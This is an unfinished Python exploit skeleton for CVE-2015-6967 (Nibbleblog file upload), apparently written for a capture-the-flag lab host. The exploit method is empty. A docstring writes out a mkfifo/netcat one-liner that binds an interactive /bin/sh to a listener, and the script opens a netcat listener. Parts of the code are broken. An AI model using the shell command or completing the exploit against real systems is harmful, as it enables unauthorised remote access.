#!./venv/bin/active
import requests
import argparse
import socket
import sys
import nclib

class NibbleExploit:

    __cve = "CVE-2015-6967"
    __description = ""

    def __init__(self):
        """ Load Exploit """
        print("Initialising exploit for {0}".format(self.__cve))

    def exploit(self, target_url):
        """
        payload = {  }
        r = requests.post('http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image')
        post
        """
        

class Listener:

    #__ip_address = "0.0.0.0"
    #__port_number = 0

    def __init__(self):
        """ Load Listener """
        print("Initialising Listener")
    
    def start(self, local_port):
        """ Set Listener to Run """

        self.nc = nclib.Netcat(listen=("127.0.0.1",local_port), verbose=True)
        print("Listening on port {0}... ".format(local_port))

        #(self.client, (remote_ip, remote_port))     
        #print(" Received connection from : {0}:{1}".format(remote_ip,remote_port))

        return self.nc
        
    def send(self, msg):
        self.nc.send(b'\x00\x0dHello, world!')
        response = self.nc.recv()
        
        print(response)

    def stop(self):
        #self.client.close()
        self.nc.close()

    def write(self, data):
        return self.sock.send(data)


def main():

    """ 
    
        Arbitrary Command Execution without -e

        $ rm -f /tmp/f; mkfifo /tmp/f
        $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

    """

    """ Parse Arguments """
    parser = argparse.ArgumentParser()
    parser.add_argument("target_url",help="Target IP address or domain name",type=str)
    args = parser.parse_args()
    
    
    """ Init Exploit """
    cve = NibbleExploit()
    listener = Listener()

    shell = listener.start(4444)
    #while True:
        
    command = input(b'~$ ')
    listener.send(command)
    
    listener.stop()

    try:
        cve.exploit(args.target_url)
    except:
        print("Generic error")
        
if __name__ == "__main__":
    main()